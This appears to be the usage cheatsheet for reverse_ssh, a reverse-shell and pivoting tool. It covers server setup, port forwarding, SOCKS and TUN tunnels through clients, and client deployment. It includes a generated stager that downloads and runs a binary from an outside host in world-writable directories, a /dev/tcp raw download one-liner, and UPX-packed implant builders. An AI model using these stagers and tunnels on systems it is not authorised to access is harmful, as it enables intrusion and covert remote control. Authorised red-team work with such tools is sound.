# Cheatsheet

This document is a bunch of common operations that you might want to just copy and paste, and not remember. 

- [Cheatsheet](#cheatsheet)
  - [Installation](#installation)
  - [Forwarding Traffic](#forwarding-traffic)
    - [Single](#single)
    - [Dynamic](#dynamic)
    - [Tunnel (ICMP/TCP/UDP)](#tunnel-icmptcpudp)
      - [Important Notice](#important-notice)
      - [VPN Script Example](#vpn-script-example)
  - [Deploying](#deploying)
    - [Via generated link](#via-generated-link)
      - [Generated Script](#generated-script)
      - [HTTP/HTTPS Download](#httphttps-download)
      - [Raw TCP](#raw-tcp)
      - [Server Port Forwarding](#server-port-forwarding)
  - [Quality of Life Shell Function](#quality-of-life-shell-function)



## Installation

Read the docker public key from your home directory. 
Warning if you run the docker command with sudo it will pull the root public key.
```sh
docker run -p3232:2222 -e EXTERNAL_ADDRESS=<your.rssh.server.internal>:3232 -e SEED_AUTHORIZED_KEYS="$(cat ~/.ssh/id_ed25519.pub)" -v ./data:/data reversessh/reverse_ssh
```

## Forwarding Traffic

### Single

```sh
# Forward port 80 from the remote host connecting to domain google.com:80 to the local machine
ssh -J rssh.server:3232 -fN  -L 80:google.com:80 <client>
```

### Dynamic

```sh
# Open a proxy port 9999 on the local machine to forward TCP through to the client
ssh -J rssh.server:3232 -fN -D 9999 <client>
```

### Tunnel (ICMP/TCP/UDP)
RSSH and SSH support creating tuntap interfaces that allow you to route traffic and create pseudo-VPN. It does take a bit more setup than just a local or remote forward (`-L`, `-R`), but in this mode you can send `UDP` and `ICMP` traffic.

#### Important Notice

If you connect to a malicious RSSH client, it will be able to connect back to your tunnel device. As such it is important not to have forwarding enabled, and to either have firewall rules to stop any connections to the local machine, or run this from within a container/netns.

Install a client on a remote machine, this will not work if you have your RSSH client on the same host as your tun device.
```sh
sudo ssh -J your.rssh.server.internal:3232 user.wombo -w 0:any

sudo ip link set dev tun0 up
sudo ip route add 0.0.0.0/0 dev tun0
```

This has some limitations, it is only able to send `UDP`/`TCP`/`ICMP`, and not arbitrary layer 3 protocols. `ICMP` is best effort and may make use of the remote hosts `ping` tool, as `ICMP` sockets are privileged on most machines. This also does not support `tap` devices, e.g layer 2 traffic, as this would require administrative access.

#### VPN Script Example

The following bash script is an example helper script to expedite a tunnel set up and automatically clean-up when the client loses connection or is exited on `ctrl-c`.

```bash
#!/bin/bash

if [[ $# -ne 3 ]]; then
    echo "Usage: $0 <interface_id> <local_ip/cidr> <rssh_client>"
    echo "Example: $0 99 10.10.10.1/24 <rssh_client>"
    exit 1
fi

tun_id="$1"
local_ip="$2"
rssh_client="$3"
iface="tun${tun_id}"

cleanup() {
    echo "[*] Cleaning up..."
    sudo ip link del "$iface" 2>/dev/null || true
}

trap cleanup EXIT

echo "[*] Creating interface $iface"

if ip link show "$iface" &>/dev/null; then
    echo "[*] Interface already exists, removing"
    sudo ip link del "$iface"
fi

sudo ip tuntap add dev "$iface" mode tun
sudo ip addr add "$local_ip" dev "$iface"
sudo ip link set "$iface" up

echo "[*] Starting RSSH VPN tunnel to $rssh_client"
echo "[*] Will cleanup on ctrl-c"

ssh -J localhost:2222 -w ${tun_id}:any "$rssh_client" -N
```

## Deploying


### Via generated link

The RSSH server can build and host client binaries (`link` command). Which is the preferred method for building and serving clients.

By default the `docker` release has this all built properly, and is recommended for use

#### Generated Script
RSSH http server supports adding `.sh`, `.py` and `.ps1` to the URL path which will generate a script you can pipe into an interpreter:

You will need to make sure that `--external_address` is correctly configured either server wide or with the `link` flag for this to work properly
```sh
curl http://your.rssh.server.internal:3232/rssh-link-name.sh
# Example of what is output

#!/bin/sh
export PATH="$PATH:/usr/local/sbin:/usr/local/bin:/usr/bin:/bin:/sbin"



download () {

    if command -v curl &> /dev/null; then
        curl http://ahhh.com:80/1606f9d1c09d4b63f4bcd0ab47210a95 -o "$1/1606f9d1c09d4b63f4bcd0ab47210a95"
    elif command -v  wget &> /dev/null; then
        wget -O "$1/1606f9d1c09d4b63f4bcd0ab47210a95" http://ahhh.com:80/1606f9d1c09d4b63f4bcd0ab47210a95
    fi

    chmod +x "$1/1606f9d1c09d4b63f4bcd0ab47210a95"
}



for i in "~" "." $(find / -maxdepth 3 -type d \( -perm -o+w \)); do

    if ! touch $i/1606f9d1c09d4b63f4bcd0ab47210a95; then
        continue
    fi

    download "$i"

    if ! "$i/1606f9d1c09d4b63f4bcd0ab47210a95"; then
        continue
    fi

    rm "$i/1606f9d1c09d4b63f4bcd0ab47210a95"

    break
done
```


#### HTTP/HTTPS Download
```sh
ssh your.rssh.server.internal -p 3232


# Generate a client and serve it on a named link
catcher$ link --name test
http://your.rssh.server.internal:3232/test
```

Then you can download it as follows:

```sh
wget http://your.rssh.server.internal:3232/test
chmod +x test
./test
```

#### Raw TCP
```sh
bash -c "exec 3<>/dev/tcp/your.rssh.server.internal/3232; echo RAWtest>&3; cat <&3" > test
```
The format for this is just `RAW` followed by the filename, i.e in this case `test`, the RSSH server `link` command can autogenerate the command for you with `--raw-download`.


E.g
```sh
ssh localhost -p 3232
catcher$ link --raw-download
bash -c "exec 3<>/dev/tcp/HOSTHERE/PORT_HERE; echo RAWad3d53653242319d2fc40c9f2c0d236c>&3; cat <&3" > ad3d53653242319d2fc40c9f2c0d236c
catcher$
```

#### Server Port Forwarding
To stop you from having to manually work out SSH jump chain logic to forward a server port down a potentially long list of clients (e.g `ssh -J rssh.server:3232,client1,client2,client3 -R 1111:rssh.server:3232`). 

You can use the `listen` command:
```sh
ssh rssh.server -p 3232

# Open the server port :4343 on your client 
catcher$ listen -c <client1_id> --on :4343

#Then after you can set up sub clients like this:
./sub-rssh-client -d client1_address:4343
```

## Quality of Life Shell Function

These example functions can be placed in your shell profile to help save keystrokes for common commands.

- Generate randomly named links quickly.
```bash
:linrssh() {
        ssh localhost -p2222 "link --upx --lzma"
}

:winrssh() {
        ssh localhost -p2222 "link --upx --lzma --goos windows"
}
```

- Create SOCKS proxy through a specified client
```bash
:socks() {
        # usage:
        # socks <client_id>
        ssh -D 9999 -J localhost:2222 $1
}
```

- Establish tunnel through a client.  Will require the [VPN script example](#vpn%20script%20example)
```bash
:rsshvpn() {
        /opt/tools/reverse_ssh/bin/rssh_vpn.sh $1 $2 $3
}
```